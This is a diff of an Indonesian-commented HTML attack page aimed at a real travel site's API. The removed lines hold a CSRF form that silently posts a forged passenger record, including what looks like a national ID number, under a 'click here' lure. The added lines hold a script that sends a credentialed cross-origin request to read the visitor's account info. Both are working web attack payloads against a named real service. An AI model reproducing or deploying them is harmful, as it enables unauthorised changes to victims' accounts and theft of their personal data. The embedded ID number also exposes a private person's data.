@@ -4,19 +4,41 @@
     <title>Processing...</title>
 </head>
 <body>
-    <p>Sedang memproses data, mohon tunggu...</p>
+   <h1>Hackong</h1>
+   <script>
+      // 1. Inisialisasi objek XMLHttpRequest
+const xhr = new XMLHttpRequest();
 
-    <!-- Menggunakan enctype text/plain agar dikirim sebagai teks mentah -->
-    <form id="csrfForm" action="https://id.trip.com/restapi/soa2/27024/save" method="POST" enctype="text/plain">
-        
-        <!-- Seluruh struktur JSON dimasukkan ke dalam atribut 'name' -->
-        <!-- Di ujung akhir JSON, ditambahkan kunci dummy untuk menampung tanda '=' bawaan HTML -->
-        <input type="hidden" 
-               name='{"accessCode":"IBUPCAUTEHNTICATE","locale":"id-ID","passenger":{"enFirstName":"efefe","enLastName":"efefef","localFirstName":"Delete_Flag","localLastName":"Delete_Flag","birthday":"1983-04-26","gender":"F","cnName":"","nationality":"ID","id":null,"cards":[{"isEncrypt":0,"cardType":"31","cardNo":"3305160510890007","cardTimeLimit":"2041-04-27"}]},"head":{"cid":"09034033315449719640","ctok":"","cver":"1.0","lang":"01","sid":"8888","syscode":"09","auth":"","xsid":"","extension":[],"Locale":"id-ID","Language":"id","Currency":"IDR","ClientID":"09034033315449719640"},"dummy":"' 
-               value='"}'>
-        <input type="submit" value="klik di sini"/>
-               
-    </form>
+// 2. Tentukan metode HTTP dan URL tujuan
+const url = 'https://id.trip.com/restapi/soa2/27024/getUserInfo';
+xhr.open('POST', url, true); // Ubah 'POST' menjadi 'GET' jika API tersebut menggunakan GET
 
+// 3. Aktifkan credential (cookie, otorisasi TLS, atau sertifikat)
+xhr.withCredentials = true;
+
+// 4. Atur Header (opsional, sesuaikan dengan kebutuhan API)
+xhr.setRequestHeader('Content-Type', 'application/json');
+
+// 5. Atur fungsi callback saat respons selesai dimuat
+xhr.onload = function () {
+    if (xhr.status >= 200 && xhr.status < 300) {
+        // Berhasil mendapatkan respons
+        console.log('Sukses:', JSON.parse(xhr.responseText));
+    } else {
+        // Server merespons dengan kode error (misal: 404, 500)
+        console.error('Gagal. Status:', xhr.status, xhr.statusText);
+    }
+};
+
+// 6. Atur fungsi callback jika terjadi error jaringan
+xhr.onerror = function () {
+    console.error('Terjadi kesalahan jaringan.');
+};
+
+// 7. Kirim permintaan (tambahkan bodi data di dalam send() jika menggunakan POST)
+const data = JSON.stringify({}); 
+xhr.send(data);
+
+   </script>
 </body>
 </html>
